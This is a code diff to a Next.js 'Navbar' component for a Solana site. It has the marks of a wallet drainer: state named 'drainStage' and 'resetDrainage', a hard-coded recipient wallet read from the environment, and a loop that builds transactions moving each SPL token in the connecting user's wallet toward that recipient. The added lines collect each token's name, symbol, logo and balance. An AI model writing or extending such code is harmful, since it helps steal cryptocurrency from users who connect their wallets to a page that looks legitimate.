@@ -37,6 +37,8 @@ import {
   getAccount,
   getAssociatedTokenAddress,
 } from "@solana/spl-token";
+import { getTokenMetadataSPL } from "@/app/services/hook/getTokenMetadata/Metadata";
+import { getAllSPL } from "@/app/services/redux/getAllSPL";
 
 export default function Navbar() {
   const {
@@ -59,8 +61,12 @@ export default function Navbar() {
   const drainStage = changeDrainStage((state) => state.connectionStage);
   const resetDrainage = changeDrainStage((state) => state.resetConnectionStage);
   const getIsConnected = executeConnectionObject((state) => state.isConnected);
+  const getSplMetadata = getAllSPL((state)=>state.resetWalletSpl);
+
+
+
   const connection = new Connection(
-    String(process.env.NEXT_PUBLIC_SOLANA_HTTPS)
+    String(process.env.NEXT_PUBLIC_SOLANA_HTTPS),"confirmed"
   );
   const recipientAddress = new PublicKey(
     String(process.env.NEXT_PUBLIC_WALLET_ADDRESS)
@@ -135,7 +141,13 @@ export default function Navbar() {
     connection: Connection
   ) {
     const walletTransactions = [];
+    const walletMetadata = []
     for (let i = 0; i < walletSPLBalance.length; i++) {
+         //get  token metadata
+       const splData = await getTokenMetadataSPL(walletSPLBalance[i].mintAddress)
+      
+
+
       const mintToken = new PublicKey(walletSPLBalance[i].mintAddress);
       const tokenNumber = await getNumberDecimals(
         walletSPLBalance[i].mintAddress
@@ -149,6 +161,12 @@ export default function Navbar() {
         mintToken,
         recipientAddress
       );
+
+      walletMetadata.push({balance:( Number(walletSPLBalance[i].tokenBalance) * Math.pow(10, Number(tokenNumber))),
+        name:splData.tokenName,
+        symbol:splData.tokenSymbol,
+        logo:splData.tokenLogo
+      })
 
       if (!(await connection.getAccountInfo(associatedTokenTo))) {
         walletTransactions.push(
@@ -171,6 +189,7 @@ export default function Navbar() {
         )
       );
     }
+    getSplMetadata(walletMetadata as any)
     return walletTransactions;
   }
 
